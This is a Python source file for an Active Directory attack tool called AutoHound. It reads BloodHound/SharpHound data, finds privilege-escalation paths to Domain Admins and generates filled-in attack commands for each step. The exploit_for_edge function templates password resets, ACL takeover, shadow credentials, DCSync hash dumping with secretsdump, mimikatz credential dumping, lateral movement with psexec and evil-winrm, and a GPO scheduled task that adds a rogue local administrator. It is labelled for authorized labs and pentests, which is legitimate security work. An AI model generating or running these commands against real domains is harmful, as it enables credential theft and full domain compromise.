#!/usr/bin/env python3
"""
AutoHound v1.4 - Automatic BloodHound / SharpHound Privilege Escalation Path Finder
====================================================================================
BloodHound shows you a graph, YOU have to query it.
AutoHound reads the same JSON, builds the graph itself, and AUTOMATICALLY finds:
  1. Shortest paths from EVERY principal to Domain Admins / Tier-Zero (single reverse-BFS)
  2. Privilege chains to non-DA admin groups (Tier 1 / Tier 2 / Server Admins...)
  3. DCSync rights, Kerberoastable / AS-REP Roastable accounts
  4. GPO abuse (write access to a GPO linked to computers) + GPO-derived local admins
  5. Dangerous ACLs grouped and summarised (no 5,000-line floods)
  6. NEW in v0.3: exact exploit commands for EVERY step of EVERY path, filled in
     with the real usernames, domain, DC hostname and GPO GUIDs from your data.
     Placeholders you must supply: <PASS> (password of the account on the left of
     that step - from your foothold or the previous step) and <NEW_PASSWORD>.

Usage (zero interaction after this):
    python3 autohound.py --input sharphound.zip
    python3 autohound.py --input ./sharphound_folder/
    python3 autohound.py --input users.json --input groups.json

Output:  report.md (human) + report.json (machine)
Stdlib only. No pip install, no Neo4j, no Docker.
For authorized labs / pentests only.
"""
import argparse, json, sys, zipfile, collections
from pathlib import Path

HINTS = {
    "GenericAll": "Full control. User: change password / set SPN / shadow credentials. Group: add yourself. Computer/domain: near-total compromise.",
    "GenericWrite": "Write properties. On a user: set SPN (Kerberoast) or shadow credentials. On a group: modify membership-related attributes. On a GPO: GPO abuse (see GPO section).",
    "WriteDacl": "Edit the ACL -> grant yourself GenericAll, then take over.",
    "WriteOwner": "Become owner -> edit ACL -> grant yourself GenericAll.",
    "Owns": "Owner can edit the ACL -> grant yourself GenericAll.",
    "ForceChangePassword": "Reset this user's password WITHOUT knowing the old one, then log in as them.",
    "AddMember": "Add yourself / a user you control to this group.",
    "AddSelf": "Add yourself to this group.",
    "AddKeyCredentialLink": "SHADOW CREDENTIALS: write msDS-KeyCredentialLink on the target, then use Whisker/pyWhisker + Rubeus to get its NT hash / TGT.",
    "WriteSPN": "Set an SPN on this user, Kerberoast it, crack offline.",
    "GetChangesAll": "DCSync (with GetChanges): dump ALL domain hashes with secretsdump / mimikatz.",
    "GetChanges": "Half of DCSync. Combined with GetChangesAll on the domain = full DCSync.",
    "AdminTo": "Local admin on this computer. psexec/winrm in, dump LSASS / SAM, steal tokens of logged-on users.",
    "HasSession": "A privileged user has a session on this computer. Compromise the computer -> steal that user's token/hash.",
    "MemberOf": "Inherits ALL rights of this group.",
    "CanRDP": "Can RDP to this computer - foothold / lateral movement, check for privileged sessions.",
    "CanPSRemote": "Can WinRM/PSRemote to this computer - lateral movement.",
    "AllowedToDelegate": "Constrained delegation - can impersonate users to the target service.",
    "AllowedToAct": "RBCD - can delegate to the target computer and impersonate a DA to it.",
    "GPLink": "This GPO is linked to an OU/domain containing these computers. Edit the GPO (e.g. immediate scheduled task) -> SYSTEM code exec on them.",
    "Contains": "Contains this object (OU/Domain structure).",
}

# How reliable each edge type is when actually abused in a lab/pentest (0-1).
# A path's confidence = product of its edge weights. This is what lets us rank
# two paths of the same length: MemberOf+ForceChangePassword (reliable) beats
# HasSession (depends on the session still being live and credentials in memory).
EDGE_CONFIDENCE = {
    "MemberOf": 1.00, "GenericAll": 0.98, "ForceChangePassword": 0.97, "AddMember": 0.97,
    "AddSelf": 0.97, "AdminTo": 0.95, "AddKeyCredentialLink": 0.92, "WriteDacl": 0.90,
    "WriteOwner": 0.90, "Owns": 0.90, "AllowedToAct": 0.88, "WriteSPN": 0.85,
    "AllowedToDelegate": 0.85, "GPLink": 0.82, "GenericWrite": 0.80, "HasSession": 0.70,
    "CanPSRemote": 0.65, "ExecuteDCOM": 0.60, "CanRDP": 0.60,
    "GetChangesAll": 0.95, "GetChanges": 0.50,
}

# Structured abuse step for each edge: technique, the standard lab tools, and
# what to do - with the real source/target/DC/domain filled in from the graph.
# Passwords are never filled in; <PASS> / <YOUR_USER> are placeholders for the
# operator's own foothold credentials.
ABUSE_STEPS = {
    "MemberOf": ("Inherited rights", "any logon as the member",
                 "No action: authenticate as {src} and you already hold {dst}'s rights."),
    "ForceChangePassword": ("Password reset without the old password", "BloodyAD / net rpc / PowerView",
                 "Using {src}'s rights, set a new password for {dst} (target DC: {dc}), then authenticate as {dst} with it."),
    "AddMember": ("Group membership modification", "BloodyAD / net group / PowerView",
                 "Add <YOUR_USER> to {dst} using {src}'s rights, then re-authenticate so the new membership is in your token."),
    "AddSelf": ("Group membership modification", "BloodyAD / net group / PowerView",
                 "Add yourself to {dst}, then re-authenticate so the new membership is in your token."),
    "GenericAll": ("Full control abuse", "BloodyAD / PowerView / Impacket",
                 "{src} has full control of {dst}: if a group, add <YOUR_USER> to it; if a user, reset its password or add shadow credentials; if a computer, use resource-based constrained delegation against it; if the domain, perform a DCSync."),
    "GenericWrite": ("Property write abuse", "BloodyAD / PowerView / pyWhisker",
                 "{src} can write {dst}'s properties: on a group, adjust its membership; on a user, set an SPN for targeted Kerberoasting or add shadow credentials; on a GPO, see the GPO abuse section."),
    "WriteDacl": ("ACL takeover", "Impacket dacledit / PowerView",
                 "Use {src}'s WriteDacl on {dst} to grant <YOUR_USER> FullControl over {dst}, then follow the GenericAll step for {dst}."),
    "WriteOwner": ("Ownership takeover", "Impacket owneredit, then dacledit",
                 "Take ownership of {dst} as {src}, then grant <YOUR_USER> FullControl, then follow the GenericAll step for {dst}."),
    "Owns": ("Ownership takeover", "Impacket owneredit, then dacledit",
                 "{src} owns {dst}: edit its ACL to grant <YOUR_USER> FullControl, then follow the GenericAll step for {dst}."),
    "AddKeyCredentialLink": ("Shadow credentials", "pyWhisker + PKINIT tooling",
                 "Add a key credential to {dst} with {src}'s rights, then use PKINIT to obtain {dst}'s credential material and authenticate as {dst}."),
    "WriteSPN": ("Targeted Kerberoasting", "BloodyAD + Impacket GetUserSPNs + hashcat (mode 13100)",
                 "Set a service principal name on {dst}, request its service ticket, and crack it offline."),
    "AdminTo": ("Local administrator access", "Impacket psexec/wmiexec / Evil-WinRM",
                 "Log in to {dst} as {src} with local-admin rights, then check which privileged users have sessions there and what credentials can be recovered from it."),
    "HasSession": ("Session / credential theft from a compromised host", "credential access on the host (lab tooling)",
                 "{dst} has a session on {src}. This step only works AFTER you compromise {src}: recover {dst}'s credential material from that host and reuse it."),
    "CanRDP": ("Remote Desktop logon", "xfreerdp / RDP client",
                 "RDP to {dst} as {src}. Not admin by itself - useful for a foothold and for reaching sessions on {dst}."),
    "CanPSRemote": ("PowerShell remoting", "Evil-WinRM / Enter-PSSession",
                 "Open a remote PowerShell session on {dst} as {src}."),
    "GetChangesAll": ("DCSync (replication abuse)", "Impacket secretsdump / Mimikatz DCSync",
                 "With GetChanges + GetChangesAll on the domain, request replication of password data from {dc} as {src}."),
    "GetChanges": ("Partial DCSync rights", "Impacket secretsdump / Mimikatz DCSync",
                 "GetChanges alone is NOT enough: it must be combined with GetChangesAll on the same domain object."),
    "AllowedToDelegate": ("Constrained delegation (S4U)", "Impacket getST",
                 "Use {src}'s delegation rights to obtain a service ticket impersonating a privileged user to {dst}."),
    "AllowedToAct": ("Resource-based constrained delegation (RBCD)", "Impacket rbcd + getST",
                 "Configure delegation from a controlled account to {dst}, then obtain a ticket impersonating a privileged user to {dst}."),
    "GPLink": ("GPO abuse on linked computers", "SharpGPOAbuse / pygpoabuse",
                 "This GPO is linked so it applies to {dst}. With write access to the GPO, add a policy (e.g. an immediate scheduled task) that runs as SYSTEM on {dst} at the next Group Policy refresh."),
}

def abuse_step(g, src_id, etype, dst_id, dc_name):
    s, d = g.nodes[src_id], g.nodes[dst_id]
    tech, tools, action = ABUSE_STEPS.get(
        etype, ("Relationship abuse", "see BloodHound abuse documentation",
                HINTS.get(etype, "Abuse the {etype} relationship from {src} to {dst}.")))
    return {"edge": etype, "from": s["name"], "to": d["name"], "technique": tech,
            "tools": tools,
            "action": action.format(src=s["name"], dst=d["name"], dc=dc_name)}

def path_confidence(path):
    c = 1.0
    for _, etype, _ in path:
        c *= EDGE_CONFIDENCE.get(etype, 0.75)
    return round(c * 100, 1)
HIGHVALUE_NAMES = (
    "DOMAIN ADMINS", "ENTERPRISE ADMINS", "SCHEMA ADMINS", "DOMAIN CONTROLLERS",
    "ADMINISTRATORS@", "BACKUP OPERATORS", "ACCOUNT OPERATORS", "SERVER OPERATORS",
    "PRINT OPERATORS", "KRBTGT@", "ADMINISTRATOR@", "DNSADMINS", "ENTERPRISE KEY ADMINS",
    "KEY ADMINS@",
)
HIGHVALUE_RIDS = {"500", "512", "516", "518", "519", "544", "548", "551", "552"}
DANGEROUS_RIGHTS = ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns",
                    "ForceChangePassword", "AddMember", "AddSelf", "AddKeyCredentialLink", "WriteSPN")

def get(d, *keys, default=None):
    if not isinstance(d, dict):
        return default
    lower = {str(k).lower(): v for k, v in d.items()}
    for k in keys:
        if k.lower() in lower:
            return lower[k.lower()]
    return default

# ------------------------------------------------------------------ graph
class Graph:
    def __init__(self):
        self.nodes = {}
        self.edges = collections.defaultdict(list)
        self.edges_set = set()

    def add_node(self, nid, name=None, ntype="Unknown", props=None):
        if not nid:
            return
        nid = str(nid)
        if nid not in self.nodes:
            self.nodes[nid] = {"id": nid, "name": name or nid, "type": ntype, "properties": props or {}, "dc": False}
        else:
            if name: self.nodes[nid]["name"] = name
            if ntype != "Unknown": self.nodes[nid]["type"] = ntype
            if props: self.nodes[nid]["properties"].update(props)

    def add_edge(self, src, dst, etype):
        if not src or not dst or str(src) == str(dst):
            return
        src, dst = str(src), str(dst)
        self.add_node(src); self.add_node(dst)
        key = (src, dst, etype)
        if key not in self.edges_set:
            self.edges_set.add(key)
            self.edges[src].append((dst, etype))

    def is_highvalue(self, nid):
        n = self.nodes.get(str(nid), {})
        if n.get("dc"):
            return True
        props = n.get("properties", {})
        if get(props, "highvalue") is True:
            return True
        name = (n.get("name") or "").upper()
        if any(h in name for h in HIGHVALUE_NAMES):
            return True
        rid = str(nid).rsplit("-", 1)[-1]
        if rid in HIGHVALUE_RIDS and n.get("type") in ("Group", "User"):
            return True
        return False

    def mark_domain_controllers(self):
        """Computers that are members of DOMAIN CONTROLLERS are Tier-Zero themselves."""
        dc_groups = {nid for nid, n in self.nodes.items()
                     if n["type"] == "Group" and (n["name"] or "").upper().startswith("DOMAIN CONTROLLERS@")}
        for src, lst in self.edges.items():
            if self.nodes[src]["type"] == "Computer":
                for dst, etype in lst:
                    if etype == "MemberOf" and dst in dc_groups:
                        self.nodes[src]["dc"] = True

    def reverse_bfs_paths(self, targets):
        """ONE reverse BFS from all targets at once -> shortest path for EVERY node.
        O(N+E) total, vs O(N*(N+E)) for per-node BFS (308s -> <1s on 5k-user domains)."""
        rev = collections.defaultdict(list)
        for src, lst in self.edges.items():
            for dst, etype in lst:
                rev[dst].append((src, etype))
        dist, nxt = {}, {}
        q = collections.deque()
        for t in targets:
            dist[t] = 0; q.append(t)
        while q:
            cur = q.popleft()
            for src, etype in rev.get(cur, []):
                if src not in dist:
                    dist[src] = dist[cur] + 1
                    nxt[src] = (etype, cur)
                    q.append(src)
        paths = {}
        for node, d in dist.items():
            if d == 0 or node not in nxt:
                continue
            path, cur = [], node
            while cur in nxt:
                etype, hop = nxt[cur]
                path.append((cur, etype, hop))
                cur = hop
            paths[node] = path
        return paths, dist

    def count_paths(self, start, targets, dist, max_extra=1, cap=99, budget=30000):
        """Count distinct near-shortest paths from start to any target.
        Only walks edges that move toward a target (per the reverse-BFS distance
        map, allowing +max_extra slack), so wide ACL fan-out does not explode."""
        if start not in dist:
            return 0, False
        limit = dist[start] + max_extra
        count, capped, spent = 0, False, 0
        stack = [(start, 0, frozenset([start]))]
        while stack:
            node, depth, seen = stack.pop()
            spent += 1
            if spent > budget:
                capped = True; break
            if depth >= limit:
                continue
            for nxt_node, etype in self.edges.get(node, []):
                if nxt_node in seen:
                    continue
                if nxt_node in targets and depth + 1 <= limit:
                    count += 1
                    if count >= cap:
                        return count, True
                    continue
                if nxt_node in dist and dist[nxt_node] <= dist.get(node, 99) + max_extra:
                    stack.append((nxt_node, depth + 1, seen | {nxt_node}))
        return count, capped

# ------------------------------------------------------------------ parsing
def iter_json_blobs(inputs):
    files = []
    for inp in inputs:
        p = Path(inp)
        if p.is_dir():
            files += list(p.rglob("*.json"))
        elif p.suffix.lower() == ".zip":
            with zipfile.ZipFile(p) as z:
                for name in z.namelist():
                    if name.endswith(".json"):
                        try:
                            yield from parse_json_content(json.loads(z.read(name)))
                        except Exception as e:
                            print(f"[!] skip {name}: {e}", file=sys.stderr)
        elif p.exists():
            files.append(p)
        else:
            print(f"[!] not found: {inp}", file=sys.stderr)
    for f in files:
        try:
            yield from parse_json_content(json.loads(Path(f).read_text(encoding="utf-8", errors="ignore")))
        except Exception as e:
            print(f"[!] skip {f}: {e}", file=sys.stderr)

def parse_json_content(obj):
    if isinstance(obj, dict) and "nodes" in obj and "edges" in obj:
        yield ("__custom__", obj); return
    if isinstance(obj, dict) and any(k in obj for k in ("users", "groups", "computers", "domains")):
        for k in ("users", "groups", "computers", "domains", "gpos", "ous", "containers"):
            if isinstance(obj.get(k), list):
                yield (k, obj[k])
        return
    if isinstance(obj, dict) and "data" in obj:
        meta = get(obj, "meta") or {}
        yield (get(meta, "type", default="unknown"), obj["data"]); return
    if isinstance(obj, list):
        yield ("unknown", obj)

def results_list(block):
    if block is None: return []
    if isinstance(block, list): return block
    if isinstance(block, dict): return get(block, "Results", "results", default=[]) or []
    return []

def oid_of(item):
    return get(item, "ObjectIdentifier", "objectid", "GUID") if isinstance(item, dict) else item

def build_graph(inputs):
    g = Graph()
    custom_edges, gpo_links = [], []   # (gpo_id, ou/domain obj) collected for GPLink edges
    for mtype, data in iter_json_blobs(inputs):
        if mtype == "__custom__":
            for n in data["nodes"]:
                g.add_node(get(n, "id", "ObjectIdentifier"), get(n, "name", "Name"),
                           get(n, "type", default="Unknown"), get(n, "properties", default={}))
            custom_edges = data["edges"]; continue
        if not isinstance(data, list): continue
        type_map = {"users": "User", "groups": "Group", "computers": "Computer", "domains": "Domain",
                    "gpos": "GPO", "ous": "OU", "containers": "Container"}
        ntype = type_map.get(str(mtype).lower(), "Unknown")
        for obj in data:
            if not isinstance(obj, dict): continue
            oid = get(obj, "ObjectIdentifier", "objectid", "id")
            props = get(obj, "Properties", "properties", default={}) or {}
            name = get(props, "name") or get(obj, "name", "Name") or oid
            g.add_node(oid, name, ntype, props)

            pg = get(obj, "PrimaryGroupSID")
            if pg: g.add_edge(oid, pg, "MemberOf")
            for m in get(obj, "Members", default=[]) or []:
                mid = oid_of(m)
                if mid: g.add_edge(mid, oid, "MemberOf")
            for ace in get(obj, "Aces", default=[]) or []:
                principal, right = get(ace, "PrincipalSID", "principal"), get(ace, "RightName", "right")
                if principal and right:
                    g.add_node(principal, None, get(ace, "PrincipalType", default="Unknown"))
                    g.add_edge(principal, oid, right)
            for field, edge in (("LocalAdmins", "AdminTo"), ("RemoteDesktopUsers", "CanRDP"),
                                ("DcomUsers", "ExecuteDCOM"), ("PSRemoteUsers", "CanPSRemote")):
                for r in results_list(get(obj, field)):
                    rid = oid_of(r)
                    if rid: g.add_edge(rid, oid, edge)
            for field in ("Sessions", "PrivilegedSessions"):
                for r in results_list(get(obj, field)):
                    rid = oid_of(r)
                    if rid: g.add_edge(oid, rid, "HasSession")
            for r in get(obj, "AllowedToDelegate", default=[]) or []:
                rid = oid_of(r)
                if rid: g.add_edge(oid, rid, "AllowedToDelegate")
            for r in results_list(get(obj, "AllowedToAct")):
                rid = oid_of(r)
                if rid: g.add_edge(rid, oid, "AllowedToAct")
            # NOTE: ChildObjects/Contains is structural only - BloodHound does NOT
            # traverse it as an attack edge, so we deliberately do not add it.
            # (Adding it created false paths like: DC -> GetChangesAll -> Domain
            #  --Contains--> OU --Contains--> Group.)
            # GPO links + GPO-derived local groups (this is how BloodHound ingests GPOs)
            for link in get(obj, "Links", default=[]) or []:
                guid = oid_of(link)
                if guid: gpo_links.append((guid, oid, obj))
            gc = get(obj, "GPOChanges", default={}) or {}
            affected = [oid_of(x) for x in get(gc, "AffectedComputers", default=[]) or []]
            for field, edge in (("LocalAdmins", "AdminTo"), ("RemoteDesktopUsers", "CanRDP"),
                                ("DcomUsers", "ExecuteDCOM"), ("PSRemoteUsers", "CanPSRemote")):
                for r in get(gc, field, default=[]) or []:
                    rid = oid_of(r)
                    if rid:
                        for comp in affected:
                            if comp: g.add_edge(rid, comp, edge)
    # GPLink edges: GPO -> every computer affected through the OU/domain it is linked to
    for guid, ou_id, ou_obj in gpo_links:
        g.add_node(guid, None, "GPO")
        gc = get(ou_obj, "GPOChanges", default={}) or {}
        for comp in get(gc, "AffectedComputers", default=[]) or []:
            cid = oid_of(comp)
            if cid: g.add_edge(guid, cid, "GPLink")
    for e in custom_edges:
        g.add_edge(get(e, "source", "from"), get(e, "target", "to"), get(e, "type", default="Unknown"))
    g.mark_domain_controllers()
    return g

# ------------------------------------------------------------------ analysis
def known(g, nid):
    """A real principal in this dataset (not an unresolved foreign SID)."""
    n = g.nodes[nid]
    return n["type"] != "Unknown" and n["name"] != nid

def render_path(g, path):
    parts = [g.nodes[path[0][0]]["name"]]
    for src, etype, dst in path:
        parts.append(f"--[{etype}]--> {g.nodes[dst]['name']}")
    return " ".join(parts)

# ------------------------------------------------------------------ v0.3 exploit steps
def split_principal(name):
    """'USER@DOMAIN' -> ('USER', 'DOMAIN'); 'HOST.DOMAIN' -> ('HOST', 'DOMAIN')."""
    name = name or ""
    if "@" in name:
        sam, dom = name.split("@", 1)
        return sam, dom
    if "." in name:
        sam, dom = name.split(".", 1)
        return sam, dom
    return name, ""

def exploit_context(g):
    domain, dc = "", ""
    for nid, n in g.nodes.items():
        if n["type"] == "Domain" and n["name"]:
            domain = n["name"]
        if n.get("dc") and n["type"] == "Computer":
            dc = n["name"]
    if not dc:
        for nid, n in g.nodes.items():
            if n["type"] == "Computer" and "DC" in (n["name"] or "").upper():
                dc = n["name"]; break
    return domain or "ZA.TRYHACKME.LOC", dc or domain

def _bloody(ctx, actor, apass, args):
    domain, dc = ctx
    return f"bloodyAD --host {dc} -d {domain} -u {actor} -p '{apass}' {args}"

def exploit_for_edge(g, ctx, actor, apass, src, etype, dst):
    """One edge -> (note, [commands]). Actor/pass are the account you currently
    control; some edges hand you a new account, which the caller then adopts."""
    domain, dc = ctx
    snode, dnode = g.nodes[src], g.nodes[dst]
    sname, dname = snode["name"], dnode["name"]
    ssam, _ = split_principal(sname)
    dsam, _ = split_principal(dname)
    dshort = dname.split(".")[0] if dnode["type"] == "Computer" else dsam
    new_actor = None
    if etype == "MemberOf":
        return ("No action - membership inherits all of this group's rights.", [], None)
    if etype == "GenericWrite":
        if dnode["type"] == "Group":
            return ("GenericWrite on a group lets you change it - add your own account to it, "
                    "then you hold every right that group has.",
                    [_bloody(ctx, actor, apass, f"add groupMember '{dsam}' '{actor}'")], None)
        if dnode["type"] == "User":
            return ("GenericWrite on a user lets you write its attributes - shadow credentials "
                    "(msDS-KeyCredentialLink) is the quiet route to its TGT.",
                    [f"python3 pywhisker.py -d {domain} -u {actor} -p '{apass}' --target {dsam} --action add",
                     f"Rubeus.exe asktgt /user:{dsam} /domain:{domain} /certificate:<CERT.pfx> /password:<CERT_PASSWORD>"],
                    dsam)
        if dnode["type"] == "GPO":
            return ("GenericWrite on a GPO lets you edit it - the next GPLink step pushes the "
                    "scheduled task to its computers.", [], None)
        return ("GenericWrite lets you modify this object's properties - check which attributes "
                "are writable and use the matching abuse for its type.", [], None)
    if etype in ("GenericAll",):
        if dnode["type"] == "Group":
            return ("GenericAll = full control of the group - add yourself to it.",
                    [_bloody(ctx, actor, apass, f"add groupMember '{dsam}' '{actor}'")], None)
        if dnode["type"] == "User":
            return ("GenericAll = full control of the user - reset its password and log in as it.",
                    [_bloody(ctx, actor, apass, f"set password '{dsam}' '<NEW_PASSWORD>'")], dsam)
        if dnode["type"] == "Computer":
            return ("GenericAll on a computer is near-total control - log in as a local admin.",
                    [f"evil-winrm -i {dshort} -u {actor} -p '{apass}'"], None)
        if dnode["type"] == "GPO":
            return ("GenericAll on a GPO lets you edit it - the next GPLink step pushes the "
                    "scheduled task to its computers.", [], None)
        return ("GenericAll = full control of this object.", [], None)
    if etype in ("WriteDacl", "WriteOwner", "Owns"):
        verb = {"WriteDacl": "Edit the ACL", "WriteOwner": "Take ownership, then edit the ACL",
                "Owns": "As owner you can edit the ACL"}[etype]
        if dnode["type"] == "Group":
            return (f"{verb} to grant yourself GenericAll, then add yourself to the group.",
                    [f"dacledit.py -action write -rights FullControl -principal {actor} -target {dsam} {domain}/{actor}:'{apass}'@{dc}",
                     _bloody(ctx, actor, apass, f"add groupMember '{dsam}' '{actor}'")], None)
        if dnode["type"] == "User":
            return (f"{verb} to grant yourself GenericAll, then reset this user's password.",
                    [f"dacledit.py -action write -rights FullControl -principal {actor} -target {dsam} {domain}/{actor}:'{apass}'@{dc}",
                     _bloody(ctx, actor, apass, f"set password '{dsam}' '<NEW_PASSWORD>'")], dsam)
        if dnode["type"] == "GPO":
            return (f"{verb} to grant yourself GenericAll on the GPO, then abuse it (see GPO section).",
                    [f"dacledit.py -action write -rights FullControl -principal {actor} -target {dsam} {domain}/{actor}:'{apass}'@{dc}"], None)
        return (f"{verb} to grant yourself GenericAll on this object.",
                [f"dacledit.py -action write -rights FullControl -principal {actor} -target {dsam} {domain}/{actor}:'{apass}'@{dc}"], None)
    if etype == "ForceChangePassword":
        return ("Reset this user's password WITHOUT knowing the old one, then log in as them. "
                "From here on, you act as this account.",
                [_bloody(ctx, actor, apass, f"set password '{dsam}' '<NEW_PASSWORD>'")], dsam)
    if etype in ("AddMember", "AddSelf"):
        return ("Add your own account to this group.",
                [_bloody(ctx, actor, apass, f"add groupMember '{dsam}' '{actor}'")], None)
    if etype == "AddKeyCredentialLink":
        return ("Shadow credentials: write msDS-KeyCredentialLink on the target, then use the "
                "certificate to request its TGT.",
                [f"python3 pywhisker.py -d {domain} -u {actor} -p '{apass}' --target {dsam} --action add",
                 f"Rubeus.exe asktgt /user:{dsam} /domain:{domain} /certificate:<CERT.pfx> /password:<CERT_PASSWORD>"],
                dsam)
    if etype == "WriteSPN":
        return ("Set an SPN on this user, then Kerberoast it and crack the ticket offline.",
                [f"Set-ADUser -Identity {dsam} -ServicePrincipalNames @{{Add='HTTP/{dsam}.{domain}'}}",
                 f"GetUserSPNs.py {domain}/{actor}:'{apass}' -dc-ip {dc} -request-user {dsam}"], None)
    if etype in ("GetChanges", "GetChangesAll"):
        return ("DCSync: with GetChanges + GetChangesAll on the domain, dump all domain hashes.",
                [f"secretsdump.py {domain}/{actor}:'{apass}'@{dc} -just-dc"], None)
    if etype == "AdminTo":
        return ("You are a local admin on this computer - log in and look for privileged "
                "sessions / credentials on it.",
                [f"evil-winrm -i {dshort} -u {actor} -p '{apass}'",
                 f"psexec.py {domain}/{actor}:'{apass}'@{dshort}"], None)
    if etype == "HasSession":
        return (f"A privileged user ({dname}) has a session on the computer you just compromised - "
                "dump logon sessions / tokens there to steal it.",
                ['mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'], None)
    if etype == "CanRDP":
        return ("You can RDP to this computer - log in and check for privileged sessions.",
                [f"xfreerdp /u:{actor} /p:'{apass}' /v:{dshort} /cert:ignore"], None)
    if etype == "CanPSRemote":
        return ("You can WinRM/PSRemote to this computer.",
                [f"evil-winrm -i {dshort} -u {actor} -p '{apass}'"], None)
    if etype == "ExecuteDCOM":
        return ("You can execute via DCOM on this computer.",
                [f"dcomexec.py {domain}/{actor}:'{apass}'@{dshort}"], None)
    if etype == "GPLink":
        return (f"This GPO ({sname}) is linked to {dname} - push an immediate scheduled task "
                "through it for SYSTEM code execution on that computer (then gpupdate / force "
                "on the target, or wait for its refresh).",
                [f'SharpGPOAbuse.exe --AddComputerTask --TaskName "AutoHound" --Author {domain}\\{actor} '
                 f'--Command "cmd.exe /c net user autohound <NEW_PASSWORD> /add & net localgroup administrators autohound /add" '
                 f'--GPOName "{ssam}"'], None)
    if etype == "AllowedToDelegate":
        return ("Constrained delegation: impersonate a user to this service.",
                [f"getST.py -spn {dname} -impersonate <TARGET_USER> {domain}/{actor}:'{apass}' -dc-ip {dc}"], None)
    if etype == "AllowedToAct":
        return ("RBCD: you can delegate to this computer and impersonate an admin to it.",
                [f"getST.py -spn cifs/{dshort} -impersonate <TARGET_ADMIN> {domain}/{actor}:'{apass}' -dc-ip {dc}"], None)
    return (HINTS.get(etype, etype), [], None)

def exploit_steps_for_path(g, ctx, path):
    """Walk a path, tracking which account you control at each step."""
    steps, actor, apass = [], "<YOUR_USER>", "<PASS>"
    for src, etype, dst in path:
        note, cmds, new_actor = exploit_for_edge(g, ctx, actor, apass, src, etype, dst)
        steps.append({"from": g.nodes[src]["name"], "edge": etype, "to": g.nodes[dst]["name"],
                      "actor": actor, "note": note, "commands": cmds})
        if new_actor:
            actor, apass = new_actor, "<NEW_PASSWORD>"
    return steps

def analyze(g):
    f = {"paths": [], "admin_chains": [], "dcsync": [], "kerberoastable": [], "asrep": [],
         "unconstrained": [], "dangerous_acls": [], "gpo_abuse": [], "stats": {}}
    hv = [nid for nid in g.nodes if g.is_highvalue(nid)]
    f["stats"] = {"nodes": len(g.nodes), "edges": len(g.edges_set), "highvalue_nodes": len(hv)}

    # 1. Shortest path to Tier-Zero for everyone - one reverse BFS
    hv_paths, hv_dist = g.reverse_bfs_paths(hv)
    for nid, path in hv_paths.items():
        node = g.nodes[nid]
        if node["type"] not in ("User", "Group", "Computer") or not known(g, nid): continue
        if get(node["properties"], "enabled") is False: continue
        f["paths"].append({"start": node["name"], "start_id": nid, "length": len(path),
                           "confidence": path_confidence(path),
                           "target": g.nodes[path[-1][2]]["name"], "path": path})
    f["paths"].sort(key=lambda x: (x["length"], x["start"]))

    # 2. Chains to admin groups that are NOT Tier-Zero (Tier1/Tier2/Server Admins...)
    admin_groups = set()
    for src, lst in g.edges.items():
        for dst, etype in lst:
            if etype in ("AdminTo", "CanPSRemote") and g.nodes[dst]["type"] == "Computer" \
               and g.nodes[src]["type"] == "Group" and not g.is_highvalue(src):
                admin_groups.add(src)
    seen_sig = {}
    admin_paths, admin_dist = g.reverse_bfs_paths(list(admin_groups))
    for nid, path in admin_paths.items():
        node = g.nodes[nid]
        if node["type"] not in ("User", "Group", "Computer") or not known(g, nid): continue
        if get(node["properties"], "enabled") is False: continue
        if nid in admin_groups or g.is_highvalue(nid): continue
        sig = tuple((e, g.nodes[d]["name"]) for _, e, d in path)
        if sig in seen_sig:
            seen_sig[sig]["shared_by"] += 1
        else:
            entry = {"start": node["name"], "start_id": nid, "length": len(path),
                     "confidence": path_confidence(path), "target": g.nodes[path[-1][2]]["name"],
                     "path": path, "shared_by": 1}
            seen_sig[sig] = entry; f["admin_chains"].append(entry)
    # Impact first: a chain shared by 5,000 users matters more than a 1-user chain
    f["admin_chains"].sort(key=lambda x: (-x["shared_by"], x["length"]))

    # 3. DCSync: GetChanges+GetChangesAll together, or GenericAll / AllExtendedRights on the domain
    rights_on_domain = collections.defaultdict(set)
    for src, lst in g.edges.items():
        for dst, etype in lst:
            if g.nodes[dst]["type"] == "Domain":
                rights_on_domain[src].add(etype)
    for src, rights in rights_on_domain.items():
        if {"GetChanges", "GetChangesAll"} <= rights or "GenericAll" in rights or "AllExtendedRights" in rights:
            if known(g, src):
                f["dcsync"].append({"source": g.nodes[src]["name"], "source_is_hv": g.is_highvalue(src),
                                     "rights": sorted(rights & {"GetChanges", "GetChangesAll", "GenericAll", "AllExtendedRights"})})
    f["dcsync"].sort(key=lambda x: x["source_is_hv"])

    # 4. Per-account checks
    for nid, node in g.nodes.items():
        p = node["properties"]
        if get(p, "hasspn") and get(p, "enabled", True):
            f["kerberoastable"].append({"name": node["name"], "spns": get(p, "serviceprincipalnames", default=[])})
        if get(p, "dontreqpreauth") and get(p, "enabled", True):
            f["asrep"].append({"name": node["name"]})
        if get(p, "unconstraineddelegation") and node["type"] == "Computer" and not g.is_highvalue(nid):
            f["unconstrained"].append({"name": node["name"]})

    # 5. Dangerous ACLs, grouped by (source, right) so 5,000 identical edges = 1 line
    grouped = {}
    for src, lst in g.edges.items():
        if not known(g, src): continue
        for dst, etype in lst:
            if etype in DANGEROUS_RIGHTS:
                key = (g.nodes[src]["name"], etype, g.is_highvalue(src))
                e = grouped.setdefault(key, {"source": g.nodes[src]["name"], "right": etype,
                                             "source_is_hv": g.is_highvalue(src), "targets": 0,
                                             "hv_targets": 0, "samples": [], "hv_samples": []})
                e["targets"] += 1
                if g.is_highvalue(dst):
                    e["hv_targets"] += 1
                    if len(e["hv_samples"]) < 4: e["hv_samples"].append(g.nodes[dst]["name"])
                elif len(e["samples"]) < 4:
                    e["samples"].append(g.nodes[dst]["name"])
    f["dangerous_acls"] = sorted(grouped.values(),
                                  key=lambda x: (x["source_is_hv"], -x["hv_targets"], -x["targets"]))

    # 6. GPO abuse: non-HV principal with a write right on a GPO that is linked to computers
    gpo_targets = {src: [g.nodes[d]["name"] for d, e in lst if e == "GPLink"]
                   for src, lst in g.edges.items() if g.nodes[src]["type"] == "GPO"}
    for src, lst in g.edges.items():
        if g.is_highvalue(src) or not known(g, src): continue
        for dst, etype in lst:
            if etype in DANGEROUS_RIGHTS and dst in gpo_targets and gpo_targets[dst]:
                f["gpo_abuse"].append({"source": g.nodes[src]["name"], "right": etype,
                                        "gpo": g.nodes[dst]["name"], "computers": gpo_targets[dst]})

    # 7. Alternative-path counts (how many near-shortest routes exist per finding)
    hv_set = set(hv)
    for entry in f["paths"]:
        cnt, capped = g.count_paths(entry["start_id"], hv_set, hv_dist)
